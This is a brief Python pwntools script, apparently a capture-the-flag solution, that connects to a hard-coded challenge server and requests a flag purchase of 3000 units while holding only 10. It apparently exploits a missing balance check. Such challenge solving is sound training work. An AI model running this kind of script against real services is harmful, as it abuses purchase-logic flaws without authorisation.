#!/usr/bin/env python3
from pwn import *
import time

# context.log_level = 'debug'

conn = remote("140.113.24.241", 30170)

conn.recvuntil(b'Welcome to the server:\nCurrent money: 10\n1. Purchase Flag\n2. Exit\nInput your choice:\n')
conn.sendline(b'1')
conn.recvuntil(b'Input the amount:\n')
conn.sendline(b'3000')

print(conn.recvline().decode("utf-8"), end = "")
print(conn.recvline().decode("utf-8"), end = "")
